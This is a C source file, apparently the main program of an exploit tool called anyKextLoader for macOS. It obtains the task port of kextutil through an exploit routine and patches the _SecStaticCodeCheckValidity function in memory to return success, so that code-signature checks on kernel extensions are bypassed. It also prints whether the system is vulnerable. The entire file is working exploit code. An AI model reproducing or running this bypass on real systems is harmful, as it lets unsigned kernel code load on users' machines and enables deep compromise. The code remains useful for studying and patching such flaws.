//
//  main.c
//  anyKextLoader
//
//  Created by Linus Henze on 30/07/15.
//  Copyright © 2016 Linus Henze. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <mach/mach.h>

#include "libinject.h"
#include "exploit.h"

int main(int argc, char * argv[]) {
    kern_return_t kr;
    pid_t child_pid = 0;
    mach_port_t childPort = forkAndGetTaskPortForProcess(&child_pid, "/usr/bin/kextutil", argc, argv);
    pid_t test;
    kr = pid_for_task(childPort, &test);
    if (kr != KERN_SUCCESS) {
        printf("Not vulnerable.\n");
        exit(0);
    }
    
    printf("Child port: %d\n", childPort);
    
    void *SecStaticCodeCheckValidity = libinj_find_symbol(childPort, "_SecStaticCodeCheckValidity");
    if (SecStaticCodeCheckValidity == NULL) {
        printf("Symbol _SecStaticCodeCheckValidity couldn't be found, but your system IS VULNERABLE!\n");
        exit(-1);
    }
    
    printf("_SecStaticCodeCheckValidity at 0x%lx\n", (unsigned long) SecStaticCodeCheckValidity);
    
    long int data = 0xC3C031; // xor eax, eax; ret; // Little-Endian
    kr = mach_vm_protect(childPort, (unsigned long long) SecStaticCodeCheckValidity, (4*8), FALSE, VM_PROT_READ | VM_PROT_WRITE);
    if (kr != KERN_SUCCESS) {
        printf("Failed to change memory protection, but your system IS VULNERABLE!\n");
        exit(-1);
    }
    kr = mach_vm_write(childPort, (unsigned long long) SecStaticCodeCheckValidity, (vm_offset_t) &data, 4);
    if (kr != KERN_SUCCESS) {
        printf("Failed to patch kextutil, but your system IS VULNERABLE!\n");
        exit(-1);
    }
    kr = mach_vm_protect(childPort, (unsigned long long) SecStaticCodeCheckValidity, (4*8), FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
    if (kr != KERN_SUCCESS) {
        printf("Failed to change memory protection, but your system IS VULNERABLE!\n");
        exit(-1);
    }
    
    printf("\n");
    kill(child_pid, SIGCONT);
    wait(&child_pid);
    
    return 0;
}
